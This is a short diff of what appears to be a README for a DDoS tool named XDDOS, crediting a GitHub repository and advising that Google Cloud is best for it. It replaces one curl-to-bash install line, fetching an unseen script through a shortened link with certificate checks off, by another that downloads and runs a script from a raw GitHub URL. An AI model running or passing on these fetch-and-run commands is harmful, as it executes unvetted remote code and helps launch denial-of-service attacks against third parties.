@@ -5,4 +5,5 @@ cloud google is best XDDOS
 
 [thank AnAverageBeing](https://github.com/AnAverageBeing/XDDOS)
 
-```curl -sLk -o a https://is.gd/NijGG8 & bash a```
+```curl https://raw.githubusercontent.com/hai723/XDDOSpower/main/XDDOS -o a
+bash a```
